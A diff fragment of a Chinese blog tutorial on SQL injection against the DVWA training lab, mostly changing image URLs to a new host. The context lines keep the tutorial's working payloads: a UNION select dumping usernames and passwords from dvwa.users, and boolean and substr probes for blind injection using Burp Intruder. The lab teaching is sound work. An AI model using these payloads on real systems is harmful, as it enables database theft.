-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-16_hube2672f1fec28615ffc8484a15975849_120547_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;列名!找到你了!喵哈哈哈哈&#34;
@@ -1380,10 +1380,10 @@
 &lt;p&gt;&lt;strong&gt;咳咳咳，不皮了&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;查询user和password两列的信息&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;and 1=2 union select user,password from dvwa.users#
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22.png&#34;
 	width=&#34;668&#34;
 	height=&#34;362&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-22_hu3a3f16b76b944507c21c7fef79b8a833_69883_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;猫猫:脱库了，你数据没了。寄&#34;
@@ -1403,10 +1403,10 @@
 &lt;h4 id=&#34;尝试显注中的方法&#34;&gt;尝试显注中的方法&lt;/h4&gt;
 &lt;p&gt;寄.&lt;/p&gt;
 &lt;p&gt;输入单引号不会报错了，仅仅提示用户名不在数据库中&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37.png&#34;
 	width=&#34;855&#34;
 	height=&#34;192&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-30_23-37_hu8be5c81652a6291cbb8e40f6dfabeb6a_16798_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;User ID is MISSING from the database.&#34;
@@ -1438,10 +1438,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;某暴躁的脚本小猫: 哪那么多事？！直接sqlmap一把梭&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33.jpg&#34;
 	width=&#34;300&#34;
 	height=&#34;300&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/33_hu2395aa55ed700d0528bef5dcdb8fb2cb_8576_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1454,10 +1454,10 @@
 &lt;p&gt;我们分别在输入框中输入&lt;code&gt;1&lt;/code&gt;,&lt;code&gt;1&#39; and 1=1#&lt;/code&gt;,&lt;code&gt;1&#39; and 1=2#&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;如果payload被带进数据库执行并产生歧义的话，&lt;code&gt;1&lt;/code&gt;和&lt;code&gt;1&#39; and 1=1#&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;返回的结果应该是一样的，而和&lt;code&gt;1&#39; and 1=2#&lt;/code&gt;的结果不一样&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07.png&#34;
 	width=&#34;337&#34;
 	height=&#34;105&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-07_hu30b5c44374dac67f26c643f7c3f21c2c_6297_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1466,10 +1466,10 @@
 		data-flex-basis=&#34;770px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06.png&#34;
 	width=&#34;340&#34;
 	height=&#34;96&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-06_hufe212a83c079b2d0ca573e12d224fa42_7274_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1478,10 +1478,10 @@
 		data-flex-basis=&#34;850px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08.png&#34;
 	width=&#34;397&#34;
 	height=&#34;106&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_00-08_huc7a751cc354fe2d6366998ac922c121a_8420_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1508,10 +1508,10 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and length(user())=14#
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来就要猜每一个字母了&lt;/p&gt;
 &lt;p&gt;我们可以利用字符ASCII值的大小进行二分&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii.jpg&#34;
 	width=&#34;653&#34;
 	height=&#34;709&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_480x0_resize_q75_box.jpg 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_1024x0_resize_q75_box.jpg 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/ascii_hu44c394602663647c9d20badf981d2d72_319214_1024x0_resize_q75_box.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;ASCII表&#34;
@@ -1594,10 +1594,10 @@
 &lt;p&gt;我们可以先随便写一个payload,&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and substr((select user from users limit 0,1),1,1)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后Burp抓包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22.png&#34;
 	width=&#34;1155&#34;
 	height=&#34;734&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1608,10 +1608,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;扔进&lt;code&gt;Intruder&lt;/code&gt;模块&lt;/p&gt;
 &lt;p&gt;把中间一个&lt;code&gt;1&lt;/code&gt;和&lt;code&gt;a&lt;/code&gt;作为参数，然后选择&lt;code&gt;Cluster bomb&lt;/code&gt;模式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29.png&#34;
 	width=&#34;1158&#34;
 	height=&#34;597&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1621,10 +1621,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;对每个字符进行遍历&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31.png&#34;
 	width=&#34;1141&#34;
 	height=&#34;421&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_1024x0_resize_box_3.png 1024w&#34;
